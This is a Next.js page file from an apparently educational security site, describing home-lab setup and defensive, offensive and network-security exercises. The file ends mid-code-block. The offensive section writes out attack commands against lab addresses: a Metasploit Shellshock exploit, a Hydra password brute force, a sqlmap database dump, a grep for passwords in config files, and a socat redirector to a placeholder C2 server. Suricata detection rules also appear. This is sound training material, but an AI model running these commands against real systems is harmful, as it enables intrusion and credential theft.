"use client"

import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { CodeBlock } from "@/components/code-block"
import { FlaskRoundIcon as Flask, ShieldAlert, Trophy, FileText } from "lucide-react"

export default function LabsPage() {
  return (
    <div className="container mx-auto py-8 px-4">
      <div className="flex items-center gap-2 mb-8">
        <Flask className="h-8 w-8 text-primary" />
        <h1 className="text-3xl font-bold">Labs & Projects</h1>
      </div>
      
      <p className="text-lg mb-8">
        Hands-on experience is crucial for security professionals. This guide provides comprehensive 
        resources for setting up security labs, running practical exercises, and building projects 
        that demonstrate your skills.
      </p>

      <Tabs defaultValue="setup">
        <TabsList className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 mb-8">
          <TabsTrigger value="setup">Lab Setup</TabsTrigger>
          <TabsTrigger value="defensive">Defensive Labs</TabsTrigger>
          <TabsTrigger value="offensive">Offensive Labs</TabsTrigger>
          <TabsTrigger value="network">Network Security</TabsTrigger>
          <TabsTrigger value="webapp">Web Security</TabsTrigger>
          <TabsTrigger value="cloud">Cloud Labs</TabsTrigger>
          <TabsTrigger value="ctf">CTF & Competitions</TabsTrigger>
          <TabsTrigger value="documentation">Documentation</TabsTrigger>
        </TabsList>

        {/* Lab Setup Tab */}
        <TabsContent value="setup">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">Lab Environment Setup</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Home Lab Architecture</h3>
                <p>
                  A well-designed home lab provides a safe environment to practice security techniques.
                  Consider these components for a comprehensive security lab:
                </p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Host machine</strong> - Powerful enough to run multiple VMs (16GB+ RAM, 6+ cores)</li>
                  <li><strong>Network equipment</strong> - Router with VLAN support, managed switch</li>
                  <li><strong>Storage</strong> - SSD for host OS and VMs (500GB+)</li>
                  <li><strong>Segmentation</strong> - Separate networks for attack, defense, and management</li>
                </ul>
                
                <Alert className="mt-4">
                  <ShieldAlert className="h-4 w-4" />
                  <AlertTitle>Important</AlertTitle>
                  <AlertDescription>
                    Always isolate your security lab from your production network and the internet
                    to prevent accidental exposure of vulnerable systems or malware.
                  </AlertDescription>
                </Alert>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Virtualization Setup</h3>
                <p>
                  Virtualization is the foundation of most security labs. Here are the main options:
                </p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>VirtualBox</strong> - Free, open-source, cross-platform</li>
                  <li><strong>VMware Workstation/Fusion</strong> - Commercial, more features</li>
                  <li><strong>Proxmox</strong> - Enterprise-grade, free hypervisor</li>
                  <li><strong>ESXi</strong> - Enterprise hypervisor, limited free version</li>
                </ul>
                
                <h4 className="text-lg font-semibold mt-4">Basic VirtualBox Network Setup</h4>
                <CodeBlock language="bash">{`# Create an isolated network for your lab
VBoxManage natnetwork add --netname seclab --network "10.0.2.0/24" --enable

# Enable DHCP on the network
VBoxManage natnetwork modify --netname seclab --dhcp on

# Connect a VM to this network
VBoxManage modifyvm "Kali Linux" --nic1 natnetwork --nat-network1 seclab`}</CodeBlock>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Containerization for Security Labs</h3>
              <p>
                Containers provide lightweight, reproducible environments for security testing:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">Docker Security Lab</h4>
                  <p>Create a docker-compose file for a basic security lab:</p>
                  <CodeBlock language="yaml">{`version: '3'
services:
  kali:
    image: kalilinux/kali-rolling
    container_name: kali
    volumes:
      - ./shared:/shared
    tty: true
    networks:
      seclab:
        ipv4_address: 172.16.238.10
        
  metasploitable:
    image: tleemcjr/metasploitable2
    container_name: metasploitable
    networks:
      seclab:
        ipv4_address: 172.16.238.20
    
  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa
    ports:
      - "8080:80"
    networks:
      seclab:
        ipv4_address: 172.16.238.30
        
networks:
  seclab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.16.238.0/24`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Essential Lab VMs/Containers</h4>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Attack platforms</strong>: Kali Linux, Parrot OS</li>
                    <li><strong>Vulnerable targets</strong>: Metasploitable, DVWA, OWASP Juice Shop</li>
                    <li><strong>Defensive systems</strong>: Security Onion, Wazuh</li>
                    <li><strong>Network devices</strong>: pfSense, OPNsense</li>
                    <li><strong>Windows environments</strong>: Windows Server, Active Directory</li>
                  </ul>
                  
                  <h4 className="text-lg font-semibold mt-4">Lab Management Tools</h4>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Vagrant</strong> - Automate VM creation and configuration</li>
                    <li><strong>Ansible</strong> - Configure systems and deploy tools</li>
                    <li><strong>Git</strong> - Version control for lab configurations</li>
                    <li><strong>Docker Compose</strong> - Orchestrate container environments</li>
                  </ul>
                </div>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Cloud-Based Lab Options</h3>
              <p>
                When physical resources are limited, cloud platforms offer alternatives:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">AWS Lab</h4>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Use VPC for network isolation</li>
                    <li>EC2 instances for VMs</li>
                    <li>Security groups for firewalls</li>
                    <li>CloudFormation for automation</li>
                    <li>Estimated cost: $50-100/month</li>
                  </ul>
                </div>
                
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">Azure Lab</h4>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Virtual Networks for isolation</li>
                    <li>Azure VMs for systems</li>
                    <li>Network Security Groups</li>
                    <li>ARM templates for deployment</li>
                    <li>Estimated cost: $40-90/month</li>
                  </ul>
                </div>
                
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">GCP Lab</h4>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>VPC networks for isolation</li>
                    <li>Compute Engine instances</li>
                    <li>Firewall rules for security</li>
                    <li>Deployment Manager for automation</li>
                    <li>Estimated cost: $40-80/month</li>
                  </ul>
                </div>
              </div>
              
              <Alert className="mt-4">
                <ShieldAlert className="h-4 w-4" />
                <AlertTitle>Cost Management</AlertTitle>
                <AlertDescription>
                  To minimize cloud costs, use spot/preemptible instances, shut down resources when not in use,
                  and leverage free tier offerings. Set up billing alerts to avoid unexpected charges.
                </AlertDescription>
              </Alert>
            </div>
          </div>
        </TabsContent>

        {/* Defensive Labs Tab */}
        <TabsContent value="defensive">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">Defensive Security Labs</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">SIEM & Log Analysis Lab</h3>
                <p>
                  Set up a Security Information and Event Management (SIEM) system to practice 
                  log collection, correlation, and analysis:
                </p>
                
                <h4 className="text-lg font-semibold">ELK Stack Setup</h4>
                <CodeBlock language="yaml">{`version: '3'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.16.2
    environment:
      - discovery.type=single-node
      - ES_JAVA_OPTS=-Xms512m -Xmx512m
    ports:
      - "9200:9200"
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data
      
  logstash:
    image: docker.elastic.co/logstash/logstash:7.16.2
    volumes:
      - ./logstash/pipeline:/usr/share/logstash/pipeline
    ports:
      - "5044:5044"
    depends_on:
      - elasticsearch
      
  kibana:
    image: docker.elastic.co/kibana/kibana:7.16.2
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
      
  filebeat:
    image: docker.elastic.co/beats/filebeat:7.16.2
    volumes:
      - ./filebeat.yml:/usr/share/filebeat/filebeat.yml:ro
      - /var/log:/var/log:ro
    depends_on:
      - elasticsearch
      - logstash
      
volumes:
  elasticsearch-data:`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">Lab Exercises</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>Configure log sources (Windows Event Logs, Linux syslog, web server logs)</li>
                  <li>Create dashboards for security monitoring</li>
                  <li>Develop detection rules for common attack patterns</li>
                  <li>Generate test events and verify detection</li>
                  <li>Practice incident response based on SIEM alerts</li>
                </ul>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Endpoint Detection & Response Lab</h3>
                <p>
                  Set up an EDR environment to practice endpoint monitoring and threat hunting:
                </p>
                
                <h4 className="text-lg font-semibold">Wazuh Setup</h4>
                <p>Wazuh provides a comprehensive open-source security monitoring solution:</p>
                <CodeBlock language="bash">{`# Clone the Wazuh Docker repository
git clone https://github.com/wazuh/wazuh-docker.git
cd wazuh-docker/single-node

# Deploy the Wazuh stack
docker-compose up -d

# Access the Wazuh dashboard
# URL: https://localhost:443
# Default credentials: admin / admin

# Install Wazuh agent on endpoints
# For Windows:
# Download from https://packages.wazuh.com/4.x/windows/wazuh-agent-4.3.10-1.msi
# Install and configure to connect to your Wazuh manager

# For Linux:
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
apt-get update
apt-get install wazuh-agent
# Edit /var/ossec/etc/ossec.conf to set the manager IP
# Start the agent: systemctl start wazuh-agent`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">Lab Exercises</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>Configure File Integrity Monitoring (FIM)</li>
                  <li>Set up custom detection rules</li>
                  <li>Simulate malware behavior and detect it</li>
                  <li>Practice threat hunting with osquery</li>
                  <li>Implement automated response actions</li>
                </ul>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Network Security Monitoring Lab</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">Security Onion Setup</h4>
                  <p>
                    Security Onion is a comprehensive network security monitoring platform:
                  </p>
                  <ol className="list-decimal pl-6 space-y-2">
                    <li>Download Security Onion ISO from <a href="https://securityonion.net/download" className="text-blue-600 hover:underline" target="_blank" rel="noopener noreferrer">securityonion.net</a></li>
                    <li>Create a VM with at least 4 CPU cores, 16GB RAM, and 200GB storage</li>
                    <li>Configure two network interfaces:
                      <ul className="list-disc pl-6">
                        <li>Management interface (with internet access)</li>
                        <li>Monitoring interface (connected to SPAN port or TAP)</li>
                      </ul>
                    </li>
                    <li>Run the setup wizard and choose "Evaluation Mode" for a lab environment</li>
                    <li>Configure Zeek, Suricata, and Elastic Stack during setup</li>
                  </ol>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Lab Exercises</h4>
                  <ul className="list-disc pl-6 space-y-2">
                    <li>Analyze network traffic with Wireshark and Zeek logs</li>
                    <li>Create and tune Suricata rules for threat detection</li>
                    <li>Build dashboards for network traffic visualization</li>
                    <li>Detect common network attacks:
                      <ul className="list-disc pl-6">
                        <li>Port scanning</li>
                        <li>Brute force attacks</li>
                        <li>Data exfiltration</li>
                        <li>C2 communication</li>
                      </ul>
                    </li>
                    <li>Practice network forensics with pcap analysis</li>
                  </ul>
                  
                  <Alert className="mt-4">
                    <ShieldAlert className="h-4 w-4" />
                    <AlertTitle>Network Visibility</AlertTitle>
                    <AlertDescription>
                      For effective monitoring, configure port mirroring on your switch or use a network TAP
                      to ensure your monitoring interface can see all relevant traffic.
                    </AlertDescription>
                  </Alert>
                </div>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Blue Team Scenarios</h3>
              <p>
                Practice these defensive scenarios to build blue team skills:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">Incident Response</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Set up a compromised system (plant malware or backdoor)</li>
                    <li>Practice the incident response process:
                      <ul className="list-disc pl-6">
                        <li>Detection and analysis</li>
                        <li>Containment</li>
                        <li>Eradication</li>
                        <li>Recovery</li>
                        <li>Lessons learned</li>
                      </ul>
                    </li>
                    <li>Document your findings and response actions</li>
                  </ol>
                </div>
                
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">Threat Hunting</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Plant indicators of compromise (IOCs) in your lab</li>
                    <li>Use threat hunting tools:
                      <ul className="list-disc pl-6">
                        <li>Osquery</li>
                        <li>Sysmon</li>
                        <li>ELK Stack</li>
                      </ul>
                    </li>
                    <li>Develop and test hunting hypotheses</li>
                    <li>Create detection rules based on findings</li>
                  </ol>
                </div>
                
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">Security Hardening</h4>
                  <ol className="list-decimal pl-6 space-y-1">
                    <li>Start with vulnerable systems</li>
                    <li>Apply security baselines:
                      <ul className="list-disc pl-6">
                        <li>CIS Benchmarks</li>
                        <li>DISA STIGs</li>
                      </ul>
                    </li>
                    <li>Use hardening tools:
                      <ul className="list-disc pl-6">
                        <li>Lynis for Linux</li>
                        <li>Microsoft SCT for Windows</li>
                      </ul>
                    </li>
                    <li>Verify improvements with vulnerability scans</li>
                  </ol>
                </div>
              </div>
            </div>
          </div>
        </TabsContent>

        {/* Offensive Labs Tab */}
        <TabsContent value="offensive">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">Offensive Security Labs</h2>
            
            <Alert className="mb-6">
              <ShieldAlert className="h-4 w-4" />
              <AlertTitle>Ethical Hacking Notice</AlertTitle>
              <AlertDescription>
                Only practice offensive security techniques in controlled lab environments or with explicit permission.
                Unauthorized testing against systems you don't own is illegal and unethical.
              </AlertDescription>
            </Alert>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Penetration Testing Lab</h3>
                <p>
                  Set up a comprehensive environment to practice penetration testing methodologies:
                </p>
                
                <h4 className="text-lg font-semibold">Attack Platform Setup</h4>
                <p>Kali Linux is the most popular penetration testing distribution:</p>
                <CodeBlock language="bash">{`# Download Kali Linux (VM or ISO)
# From: https://www.kali.org/get-kali/

# Update and install additional tools
sudo apt update
sudo apt upgrade -y
sudo apt install -y metasploit-framework burpsuite nmap dirb nikto sqlmap hydra john

# Set up a persistent workspace
mkdir -p ~/engagements/lab1
cd ~/engagements/lab1
mkdir {recon,exploitation,post-exploit,loot,reports}

# Create a target list
echo "10.0.2.5" > targets.txt
echo "10.0.2.10" >> targets.txt

# Start your reconnaissance
sudo nmap -sS -A -T4 -oA recon/initial-scan -iL targets.txt`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">Target Environment</h4>
                <p>Set up vulnerable targets to practice against:</p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Metasploitable 2/3</strong> - Intentionally vulnerable Linux VMs</li>
                  <li><strong>DVWA</strong> - Damn Vulnerable Web Application</li>
                  <li><strong>OWASP Juice Shop</strong> - Modern vulnerable web application</li>
                  <li><strong>Vulnhub VMs</strong> - Various vulnerable machines</li>
                  <li><strong>Windows lab</strong> - Unpatched Windows systems</li>
                </ul>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Penetration Testing Methodology</h3>
                <p>
                  Practice a structured approach to penetration testing:
                </p>
                
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">1. Reconnaissance</h4>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Passive information gathering (OSINT)</li>
                    <li>Network scanning with Nmap</li>
                    <li>Service enumeration</li>
                    <li>Web application discovery</li>
                  </ul>
                  <CodeBlock language="bash">{`# Basic network scan
sudo nmap -sS -A -T4 10.0.2.0/24

# Service enumeration
sudo nmap -sV -sC -p- 10.0.2.5

# Web application discovery
dirb http://10.0.2.5/ /usr/share/wordlists/dirb/common.txt`}</CodeBlock>
                </div>
                
                <div className="border p-4 rounded-lg mt-4">
                  <h4 className="text-lg font-semibold">2. Vulnerability Assessment</h4>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Identify vulnerabilities in discovered services</li>
                    <li>Use vulnerability scanners</li>
                    <li>Manual testing for false positives/negatives</li>
                  </ul>
                  <CodeBlock language="bash">{`# Vulnerability scanning with Nessus (if available)
# Or use OpenVAS

# Web vulnerability scanning
nikto -h http://10.0.2.5

# SQL injection testing
sqlmap -u "http://10.0.2.5/page.php?id=1" --dbs`}</CodeBlock>
                </div>
                
                <div className="border p-4 rounded-lg mt-4">
                  <h4 className="text-lg font-semibold">3. Exploitation</h4>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Exploit identified vulnerabilities</li>
                    <li>Gain initial access</li>
                    <li>Document successful attack paths</li>
                  </ul>
                  <CodeBlock language="bash">{`# Using Metasploit
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.0.2.5
set TARGETURI /cgi-bin/vulnerable.cgi
exploit

# Password cracking
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.5 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`}</CodeBlock>
                </div>
                
                <div className="border p-4 rounded-lg mt-4">
                  <h4 className="text-lg font-semibold">4. Post-Exploitation</h4>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Privilege escalation</li>
                    <li>Lateral movement</li>
                    <li>Data exfiltration</li>
                    <li>Persistence (if in scope)</li>
                  </ul>
                  <CodeBlock language="bash">{`# Linux privilege escalation
./linpeas.sh

# Windows privilege escalation
.\winPEAS.exe

# Data collection
find / -name "*.conf" -o -name "*.config" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null`}</CodeBlock>
                </div>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Specialized Offensive Labs</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">Web Application Hacking</h4>
                  <p>Practice OWASP Top 10 vulnerabilities:</p>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Set up DVWA, Juice Shop, WebGoat</li>
                    <li>Configure Burp Suite as a proxy</li>
                    <li>Practice:
                      <ul className="list-disc pl-6">
                        <li>SQL Injection</li>
                        <li>XSS (Cross-Site Scripting)</li>
                        <li>CSRF (Cross-Site Request Forgery)</li>
                        <li>Broken Authentication</li>
                        <li>Insecure Deserialization</li>
                      </ul>
                    </li>
                  </ul>
                </div>
                
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">Active Directory Attacks</h4>
                  <p>Set up a Windows domain environment:</p>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Windows Server with AD DS</li>
                    <li>Multiple domain-joined clients</li>
                    <li>Misconfigured permissions</li>
                    <li>Practice:
                      <ul className="list-disc pl-6">
                        <li>Kerberoasting</li>
                        <li>Pass-the-Hash</li>
                        <li>Token Impersonation</li>
                        <li>BloodHound enumeration</li>
                        <li>Golden Ticket attacks</li>
                      </ul>
                    </li>
                  </ul>
                </div>
                
                <div className="border p-4 rounded-lg">
                  <h4 className="text-lg font-semibold">Wireless Security</h4>
                  <p>Set up a wireless testing environment:</p>
                  <ul className="list-disc pl-6 space-y-1">
                    <li>Wireless access point with different security modes</li>
                    <li>Compatible wireless adapter for monitoring</li>
                    <li>Practice:
                      <ul className="list-disc pl-6">
                        <li>WEP/WPA/WPA2 cracking</li>
                        <li>Evil Twin attacks</li>
                        <li>Client deauthentication</li>
                        <li>WPS vulnerabilities</li>
                        <li>Wireless packet analysis</li>
                      </ul>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Red Team Exercises</h3>
              <p>
                Move beyond simple penetration testing to practice full red team operations:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">Red Team Infrastructure</h4>
                  <p>Set up a proper red team infrastructure:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>C2 Framework</strong> - Set up Cobalt Strike, Covenant, or Metasploit</li>
                    <li><strong>Redirectors</strong> - Configure Apache/Nginx for traffic redirection</li>
                    <li><strong>Domain fronting</strong> - Practice domain fronting techniques</li>
                    <li><strong>Phishing infrastructure</strong> - Set up GoPhish or similar</li>
                  </ul>
                  
                  <CodeBlock language="bash">{`# Example: Setting up a simple C2 redirector with socat
# On your redirector server:
socat TCP4-LISTEN:80,fork TCP4:actual-c2-server:80

# Setting up Apache as a redirector
apt install apache2
# Configure Apache with mod_rewrite to forward specific paths`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Red Team Scenarios</h4>
                  <p>Practice these advanced red team scenarios:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Initial Access</strong>:
                      <ul className="list-disc pl-6">
                        <li>Phishing campaigns with GoPhish</li>
                        <li>Weaponized documents</li>
                        <li>Physical access attacks</li>
                      </ul>
                    </li>
                    <li><strong>Evasion Techniques</strong>:
                      <ul className="list-disc pl-6">
                        <li>AV/EDR evasion</li>
                        <li>Living off the land techniques</li>
                        <li>Traffic obfuscation</li>
                      </ul>
                    </li>
                    <li><strong>Persistence</strong>:
                      <ul className="list-disc pl-6">
                        <li>Registry modifications</li>
                        <li>Scheduled tasks</li>
                        <li>Service creation</li>
                      </ul>
                    </li>
                    <li><strong>Data Exfiltration</strong>:
                      <ul className="list-disc pl-6">
                        <li>DNS tunneling</li>
                        <li>Steganography</li>
                        <li>Encrypted channels</li>
                      </ul>
                    </li>
                  </ul>
                </div>
              </div>
              
              <Alert className="mt-4">
                <ShieldAlert className="h-4 w-4" />
                <AlertTitle>OPSEC Considerations</AlertTitle>
                <AlertDescription>
                  Practice operational security in your red team exercises. Document your infrastructure,
                  maintain proper access controls, and ensure all activities are contained within your lab environment.
                </AlertDescription>
              </Alert>
            </div>
          </div>
        </TabsContent>

        {/* Network Security Tab */}
        <TabsContent value="network">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">Network Security Labs</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Network Segmentation Lab</h3>
                <p>
                  Practice implementing network segmentation and security controls:
                </p>
                
                <h4 className="text-lg font-semibold">pfSense Firewall Setup</h4>
                <ol className="list-decimal pl-6 space-y-2">
                  <li>Download pfSense ISO from <a href="https://www.pfsense.org/download/" className="text-blue-600 hover:underline" target="_blank" rel="noopener noreferrer">pfsense.org</a></li>
                  <li>Create a VM with at least 2 network interfaces</li>
                  <li>Install pfSense and complete initial setup</li>
                  <li>Configure network interfaces:
                    <ul className="list-disc pl-6">
                      <li>WAN (Internet-facing)</li>
                      <li>LAN (Internal network)</li>
                      <li>DMZ (For public-facing services)</li>
                      <li>Additional segments as needed</li>
                    </ul>
                  </li>
                </ol>
                
                <h4 className="text-lg font-semibold mt-4">Network Segmentation Design</h4>
                <p>Create a segmented network with these zones:</p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Management Network</strong> (10.0.1.0/24) - Admin access only</li>
                  <li><strong>User Network</strong> (10.0.2.0/24) - Workstations and user devices</li>
                  <li><strong>Server Network</strong> (10.0.3.0/24) - Internal servers</li>
                  <li><strong>DMZ</strong> (10.0.4.0/24) - Public-facing services</li>
                  <li><strong>IoT Network</strong> (10.0.5.0/24) - IoT devices</li>
                </ul>
                
                <CodeBlock language="bash">{`# Example pfSense firewall rules (conceptual)

# Allow management network to access all networks
allow from 10.0.1.0/24 to any

# Allow user network to access internet and servers, but not management
allow from 10.0.2.0/24 to 10.0.3.0/24 port 80,443,3389
allow from 10.0.2.0/24 to WAN

# Allow DMZ to access internet only
allow from 10.0.4.0/24 to WAN
deny from 10.0.4.0/24 to 10.0.1.0/24,10.0.2.0/24,10.0.3.0/24

# Allow internet to access only DMZ services
allow from WAN to 10.0.4.0/24 port 80,443

# Isolate IoT network
allow from 10.0.5.0/24 to WAN
deny from 10.0.5.0/24 to 10.0.1.0/24,10.0.2.0/24,10.0.3.0/24,10.0.4.0/24`}</CodeBlock>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">IDS/IPS Lab</h3>
                <p>
                  Set up and configure intrusion detection and prevention systems:
                </p>
                
                <h4 className="text-lg font-semibold">Suricata Setup</h4>
                <CodeBlock language="bash">{`# Install Suricata on Ubuntu/Debian
sudo apt update
sudo apt install -y suricata

# Update Suricata rules
sudo suricata-update

# Configure Suricata to monitor your network interface
sudo nano /etc/suricata/suricata.yaml
# Set HOME_NET to your network range
# Configure the appropriate interface

# Start Suricata in IDS mode
sudo systemctl start suricata

# View alerts
sudo tail -f /var/log/suricata/fast.log

# For IPS mode, configure NFQ or AF_PACKET inline mode
# and set appropriate iptables rules`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">Custom Rule Development</h4>
                <p>Practice writing custom Suricata/Snort rules:</p>
                <CodeBlock language="bash">{`# Create a custom rules file
sudo nano /etc/suricata/rules/local.rules

# Example rules:

# Detect ping sweeps
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Sweep"; \
  threshold:type threshold, track by_src, count 5, seconds 60; \
  classtype:network-scan; sid:10000001; rev:1;)

# Detect SSH brute force
alert tcp any any -> $HOME_NET 22 (msg:"Potential SSH Brute Force"; \
  flow:to_server; threshold:type threshold, track by_src, count 5, seconds 60; \
  classtype:attempted-admin; sid:10000002; rev:1;)

# Detect unusual User-Agent strings
alert http any any -> $HOME_NET any (msg:"Unusual User-Agent"; \
  flow:to_server,established; http.user_agent; content:"curl"; \
  classtype:trojan-activity; sid:10000003; rev:1;)

# Reload rules
sudo suricatasc -c reload-rules`}</CodeBlock>

                <h4 className="text-lg font-semibold mt-4">Lab Exercises</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>Generate test traffic to trigger alerts</li>
                  <li>Tune rules to reduce false positives</li>
                  <li>Integrate with ELK Stack for visualization</li>
                  <li>Compare IDS vs. IPS mode effectiveness</li>
                  <li>Test evasion techniques and countermeasures</li>
                </ul>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">VPN and Secure Remote Access Lab</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">OpenVPN Setup</h4>
                  <p>Configure a secure VPN server for remote access:</p>
                  <CodeBlock language="bash">{`# Install OpenVPN on Ubuntu
sudo apt update
sudo apt install -y openvpn easy-rsa

# Set up a PKI for certificate management
mkdir -p ~/openvpn-ca
cp -r /usr/share/easy-rsa/* ~/openvpn-ca/
cd ~/openvpn-ca

# Initialize the PKI
./easyrsa init-pki
./easyrsa build-ca
./easyrsa gen-req server nopass
./easyrsa sign-req server server
./easyrsa gen-dh

# Generate client certificates
./easyrsa gen-req client1 nopass
./easyrsa sign-req client client1

# Configure OpenVPN server
sudo cp ~/openvpn-ca/pki/ca.crt /etc/openvpn/
sudo cp ~/openvpn-ca/pki/issued/server.crt /etc/openvpn/
sudo cp ~/openvpn-ca/pki/private/server.key /etc/openvpn/
sudo cp ~/openvpn-ca/pki/dh.pem /etc/openvpn/

# Create server configuration
sudo nano /etc/openvpn/server.conf

# Start OpenVPN server
sudo systemctl start openvpn@server`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Secure Remote Access Lab Exercises</h4>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>VPN Security Testing</strong>:
                      <ul className="list-disc pl-6">
                        <li>Test different VPN protocols (OpenVPN, WireGuard, IPsec)</li>
                        <li>Analyze VPN traffic with Wireshark</li>
                        <li>Test split tunneling configurations</li>
                        <li>Implement and test 2FA for VPN access</li>
                      </ul>
                    </li>
                    <li><strong>Secure SSH Configuration</strong>:
                      <ul className="list-disc pl-6">
                        <li>Configure key-based authentication</li>
                        <li>Implement SSH jump hosts</li>
                        <li>Set up SSH tunneling</li>
                        <li>Configure SSH security hardening</li>
                      </ul>
                    </li>
                    <li><strong>Remote Desktop Security</strong>:
                      <ul className="list-disc pl-6">
                        <li>Secure RDP with Network Level Authentication</li>
                        <li>Implement RD Gateway</li>
                        <li>Test RDP security with various tools</li>
                      </ul>
                    </li>
                  </ul>
                  
                  <Alert className="mt-4">
                    <ShieldAlert className="h-4 w-4" />
                    <AlertTitle>Remote Access Security</AlertTitle>
                    <AlertDescription>
                      Always implement defense in depth for remote access. Combine VPNs with strong authentication,
                      network segmentation, and monitoring to protect remote entry points.
                    </AlertDescription>
                  </Alert>
                </div>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Network Traffic Analysis Lab</h3>
              <p>
                Set up a lab for practicing network traffic analysis and forensics:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">Traffic Capture Setup</h4>
                  <p>Configure systems to capture and analyze network traffic:</p>
                  <CodeBlock language="bash">{`# Install Wireshark and tcpdump
sudo apt update
sudo apt install -y wireshark tcpdump tshark

# Capture traffic with tcpdump
sudo tcpdump -i eth0 -w capture.pcap

# Continuous capture with rotation
sudo tcpdump -i eth0 -G 3600 -w 'capture-%Y%m%d-%H%M%S.pcap' -z gzip

# Targeted capture (e.g., only HTTP traffic)
sudo tcpdump -i eth0 -w http-traffic.pcap port 80

# Convert pcap to readable format
